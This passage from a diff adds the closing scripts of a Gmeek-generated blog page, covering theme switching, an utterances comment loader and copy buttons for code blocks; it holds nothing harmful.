.21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
